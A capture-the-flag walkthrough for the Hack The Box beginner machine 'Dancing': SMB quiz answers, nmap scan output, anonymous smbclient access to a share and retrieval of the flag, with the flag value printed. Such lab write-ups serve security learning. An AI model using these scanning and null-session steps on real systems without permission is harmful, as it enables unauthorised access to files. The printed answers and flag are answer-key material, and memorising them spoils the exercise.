# Dancing (Windows)

## Machine Details 

- **CTF:** Hack The Box
- **Category:** Tier 0

## Solution

#### 1. What does the 3-letter acronym SMB stand for?

> Server Message Block

#### 2. What port does SMB use to operate at?

> 445

#### 3. What is the service name for port 445 that came up in our Nmap scan?

```sh
$ nmap -A -T4 10.129.1.12
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-01 12:48 CET
Nmap scan report for 10.129.1.12
Host is up (0.034s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-01T15:48:59
|_  start_date: N/A
|_clock-skew: 3h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.41 seconds
```

> microsoft-ds

#### 4. What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

> -L

#### 5. How many shares are there on Dancing?

```sh
$ smbclient -L 10.129.1.12
Password for [WORKGROUP\]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
```

> 4

#### 6. What is the name of the share we are able to access in the end with a blank password?

```sh
$ smbclient \\\\10.129.1.12\\WorkShares 
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \>
```

> WorkShares

#### 7. What is the command we can use within the SMB shell to download the files we find?

> get

#### Submit root flag

```sh
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

		5114111 blocks of size 4096. 1732674 blocks available
smb: \> ls James.P\
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

		5114111 blocks of size 4096. 1732664 blocks available
smb: \> get James.P\flag.txt 
getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \> 
$ cat James.P\\flag.txt 
5f61c10dffbc77a704d76016a22f1664
```

## Final Flag

> 5f61c10dffbc77a704d76016a22f1664

*Created by [bu19akov](https://github.com/bu19akov)*